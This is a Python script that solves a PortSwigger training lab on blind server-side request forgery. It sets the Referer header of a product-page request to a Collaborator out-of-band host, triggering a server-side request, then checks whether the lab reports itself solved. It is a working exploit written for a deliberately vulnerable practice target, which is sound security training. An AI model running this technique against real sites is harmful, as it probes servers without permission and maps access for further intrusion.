# Blind SSRF with out-of-band detection

# https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

product_path = '/product?productId=1'


##########################################################
#	FUNCTIONS
##########################################################

def send_ssrf(s, url, collab):
	product_url = url + product_path
	headers = {"Referer": "http://" + collab}
	r = s.get(product_url, headers=headers)
	if r.status_code == 200:
		print("[+] Successfully sent the request...")
		print("[+] You should Poll Now your collaborator...")
		return r
	else:
		print("[-] Exploit has FAILED to send the request <!>")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SSRF with out-of-band detection')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind SSRF with out-of-band detection")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	# parser.add_argument('-C',dest='collab',required=True, help="Collaborator URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("\n[+] Sending Blind SSRF via the Referer header...")
			collab = "xxxxxxxxxxxxxxxxxxxx.oastify.com"
			# collab = args.collab
			send_ssrf(s, url, collab)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print("[+] The request didn't solve the lab <!>")
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
